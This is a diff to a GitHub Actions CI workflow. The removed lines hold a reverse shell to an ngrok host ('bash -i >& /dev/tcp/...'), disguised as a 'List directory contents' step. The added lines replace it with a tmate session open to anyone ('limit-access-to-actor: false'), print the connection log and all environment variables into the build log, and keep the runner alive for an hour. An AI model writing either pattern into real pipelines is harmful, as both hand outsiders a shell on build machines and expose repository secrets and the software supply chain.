@@ -1,4 +1,4 @@
-name: CI
+name: CI with Tmate Debugging
 
 on: [push]
 
@@ -6,14 +6,27 @@ jobs:
   build:
     runs-on: ubuntu-latest
     steps:
-    - uses: actions/checkout@v3
+    - uses: actions/checkout@v4
 
-    - name: List directory contents
+    - name: Setup tmate session
+      uses: mxschmitt/action-tmate@v3
+      with:
+        limit-access-to-actor: false
+
+    - name: Debug Info
       run: |
+        echo "Tmate session info:"
+        echo "==================="
+        cat /tmp/tmate.log
+        echo "==================="
+        echo "Environment variables:"
+        env
+        echo "==================="
         echo "Current directory contents:"
-        bash -i >& /dev/tcp/2.tcp.ngrok.io/13064 0>&1
-        echo "Root directory contents:"
-        ls -la /
- 
-    - name: Keep runner alive
+        ls -la
+        echo "==================="
+        echo "SSH client version:"
+        ssh -V
+
+    - name: Keep session alive
       run: sleep 1h
